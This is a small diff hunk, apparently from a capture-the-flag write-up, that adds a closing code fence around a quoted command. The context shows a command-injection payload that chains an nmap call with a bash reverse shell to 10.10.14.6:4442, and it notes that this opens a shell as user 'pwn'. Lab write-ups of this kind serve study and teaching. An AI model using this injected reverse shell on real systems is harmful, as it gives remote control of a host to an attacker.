@@ -147,6 +147,7 @@ The space in front is for the `cut -d ' ' -f3-` command because it will grab the
 
 ```
 sh -c "nmap --top-ports 10 -oN recon/; /bin/bash -c 'bash -i >& /dev/tcp/10.10.14.6/4442 0>&1' # rest of command here"
+```
 
 which will force a bash shell to open as `pwn`.
 
